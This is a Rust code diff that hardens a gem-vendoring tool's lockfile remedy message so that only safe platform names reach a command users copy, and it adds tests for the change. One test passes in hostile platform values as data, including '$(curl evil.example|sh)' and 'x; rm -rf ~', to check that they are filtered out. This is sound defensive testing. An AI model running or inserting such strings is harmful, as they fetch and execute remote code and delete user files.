@@ -783,9 +783,9 @@ fn platform_lock_refusal(
         return Some((
             "platform_gem_unsupported",
             format!(
-                "{GEMFILE_LOCK} locks `{name} ({version})` (the ruby platform) beside the platform gems {}: a vendored directory of prebuilt platform gems has nothing for the ruby platform, and bundler never builds a `path:` gem's extensions. {} to vendor {name}",
+                "{GEMFILE_LOCK} locks `{name} ({version})` (the ruby platform) beside the platform gems {}: a vendored directory of prebuilt platform gems has nothing for the ruby platform, and bundler never builds a `path:` gem's extensions. {}",
                 entries.join(", "),
-                plain_entry_remedy(&locked.platforms, lock_text)
+                plain_entry_remedy(name, &locked.platforms, lock_text)
             ),
         ));
     }
@@ -810,34 +810,42 @@ fn platform_lock_refusal(
     ))
 }
 
-/// How to drop the plain `name (version)` entry of a gem whose platform
-/// builds are `builds` from the lock `lock_text` (#2284). Bundler keeps
-/// that entry for `ruby` and for every other locked platform that none of
-/// the builds serves, so `bundle lock --remove-platform ruby` alone clears
-/// it only when `ruby` is the one such platform. The remedy names each of
-/// them, and none when the lock shows none (no `PLATFORMS`, or a platform
-/// [`crate::formats::gem::platform`] cannot read).
+/// How to drop the plain `name (version)` entry of the gem `name`, whose
+/// platform builds are `builds`, from the lock `lock_text` (#2284). Bundler
+/// keeps that entry for `ruby` and for every other locked platform that
+/// none of the builds serves, so `bundle lock --remove-platform ruby` alone
+/// clears it only when `ruby` is the one such platform. The remedy names
+/// each of them, and none when the lock shows none (no `PLATFORMS`). When a
+/// locked platform or a build is one [`crate::formats::gem::platform`]
+/// cannot read, it says that such a platform may keep the entry as well.
 ///
 /// SECURITY: `PLATFORMS` is a committed, tamper-able section and the
 /// remedy is a command the user copies, so only a platform in the plain
-/// gem-token charset is printed.
-fn plain_entry_remedy(builds: &[String], lock_text: &str) -> String {
-    let locked: Vec<&str> = crate::formats::gem::locked_platforms(lock_text)
-        .into_iter()
-        .filter(|platform| is_platform_dir_name(platform))
-        .collect();
-    let kept_for = crate::formats::gem::platform::unserved_platforms(&locked, builds);
-    match kept_for.as_slice() {
-        [] => "Bundler keeps that entry for a locked platform that none of those builds serves. Remove that platform from the lock (`bundle lock --remove-platform <platform>`)".to_string(),
-        ["ruby"] => "Remove the ruby platform from the lock (`bundle lock --remove-platform ruby`)".to_string(),
+/// gem-token charset that does not start like an option is printed.
+fn plain_entry_remedy(name: &str, builds: &[String], lock_text: &str) -> String {
+    let printable = |platform: &&str| {
+        is_platform_dir_name(platform) && platform.starts_with(|c: char| c.is_ascii_alphanumeric())
+    };
+    let all = crate::formats::gem::locked_platforms(lock_text);
+    let locked: Vec<&str> = all.iter().copied().filter(printable).collect();
+    let unserved = crate::formats::gem::platform::unserved_platforms(&locked, builds);
+    let complete = unserved.complete && locked.len() == all.len();
+    let remedy = match unserved.platforms.as_slice() {
+        [] => format!("Bundler keeps that entry for a locked platform that none of those builds serves. Remove that platform from the lock (`bundle lock --remove-platform <platform>`) to vendor {name}"),
+        ["ruby"] => format!("Remove the ruby platform from the lock (`bundle lock --remove-platform ruby`) to vendor {name}"),
+        [platform] => format!("Bundler keeps that entry for the locked platform `{platform}`, which none of those builds serves. Remove it from the lock, if the project is not installed there (`bundle lock --remove-platform {platform}`), to vendor {name}"),
         platforms => {
             let named: Vec<String> = platforms.iter().map(|p| format!("`{p}`")).collect();
             format!(
-                "Bundler keeps that entry for each locked platform that none of those builds serves: {}. Remove each of them from the lock, if the project is not installed there (`bundle lock --remove-platform {}`),",
+                "Bundler keeps that entry for each locked platform that none of those builds serves: {}. Remove each of them from the lock, if the project is not installed there (`bundle lock --remove-platform {}`), to vendor {name}",
                 named.join(", "),
                 platforms.join(" ")
             )
         }
+    };
+    match complete || unserved.platforms.is_empty() {
+        true => remedy,
+        false => format!("{remedy}. If the plain entry stays, another locked platform keeps it as well: remove that one the same way"),
     }
 }
 
@@ -12527,7 +12535,9 @@ mod tests {
 
         /// SECURITY: `PLATFORMS` is a committed, tamper-able section, and
         /// the remedy is a command the user copies. A platform that is not
-        /// a plain gem token is never printed.
+        /// a plain gem token, or that starts like an option, is never
+        /// printed; the remedy says a platform it did not name may keep
+        /// the entry.
         #[test]
         fn the_plain_entry_remedy_prints_no_unsafe_platform() {
             let lock = rails_lock(
@@ -12535,6 +12545,8 @@ mod tests {
                     "arm-linux-gnu",
                     "$(curl evil.example|sh)",
                     "x; rm -rf ~",
+                    "--linux",
+                    "-darwin",
                     "ruby",
                 ],
                 false,
@@ -12544,10 +12556,73 @@ mod tests {
                 detail.contains("(`bundle lock --remove-platform arm-linux-gnu ruby`)"),
                 "{detail}"
             );
+            for unsafe_text in ["curl", "rm -rf", "--linux", " -darwin", "`-darwin"] {
+                assert!(!detail.contains(unsafe_text), "{detail}");
+            }
             assert!(
-                !detail.contains("curl") && !detail.contains("rm -rf"),
+                detail.ends_with(
+                    "another locked platform keeps it as well: remove that one the same way"
+                ),
                 "{detail}"
             );
+        }
+
+        /// A `PLATFORMS` line the lock repeats (a hand-merged lock) is
+        /// named once: Bundler refuses `--remove-platform ruby ruby`.
+        #[test]
+        fn the_plain_entry_remedy_names_a_repeated_platform_once() {
+            let lock = rails_lock(&["arm64-darwin", "ruby", "x86_64-linux-gnu", "ruby"], true);
+            let detail = plain_entry_detail(&lock, "nokogiri", "1.19.7");
+            assert!(
+                detail.ends_with(
+                    "Remove the ruby platform from the lock (`bundle lock --remove-platform ruby`) to vendor nokogiri"
+                ),
+                "{detail}"
+            );
+            let lock = rails_lock(&["arm-linux-gnu", "ruby", "arm-linux-gnu", "ruby"], false);
+            let detail = plain_entry_detail(&lock, "thruster", "0.1.28");
+            assert!(
+                detail.contains("(`bundle lock --remove-platform arm-linux-gnu ruby`)"),
+                "{detail}"
+            );
+        }
+
+        /// One platform other than `ruby` is worded as one.
+        #[test]
+        fn the_plain_entry_remedy_words_one_platform_as_one() {
+            let lock = rails_lock(
+                &["arm-linux-musl", "arm64-darwin", "x86_64-linux-gnu"],
+                false,
+            );
+            let detail = plain_entry_detail(&lock, "thruster", "0.1.28");
+            assert!(
+                detail.ends_with(
+                    "Bundler keeps that entry for the locked platform `arm-linux-musl`, which none of those builds serves. Remove it from the lock, if the project is not installed there (`bundle lock --remove-platform arm-linux-musl`), to vendor thruster"
+                ),
+                "{detail}"
+            );
+        }
+
+        /// A locked platform of a system the platform port cannot read
+        /// (FreeBSD) may keep the plain entry too. It is not named, and the
+        /// remedy does not promise that the named ones are all of them.
+        #[test]
+        fn the_plain_entry_remedy_says_when_it_could_not_read_a_platform() {
+            let lock = rails_lock(&["ruby", "x86_64-freebsd-14", "x86_64-linux-gnu"], true);
+            for (name, version) in [("nokogiri", "1.19.7"), ("thruster", "0.1.28")] {
+                let detail = plain_entry_detail(&lock, name, version);
+                assert!(
+                    detail.contains("(`bundle lock --remove-platform ruby`)"),
+                    "{detail}"
+                );
+                assert!(!detail.contains("`x86_64-freebsd-14`"), "{detail}");
+                assert!(
+                    detail.ends_with(&format!(
+                        "to vendor {name}. If the plain entry stays, another locked platform keeps it as well: remove that one the same way"
+                    )),
+                    "{detail}"
+                );
+            }
         }
 
         /// A native gem locked for the ruby platform alone is still refused,
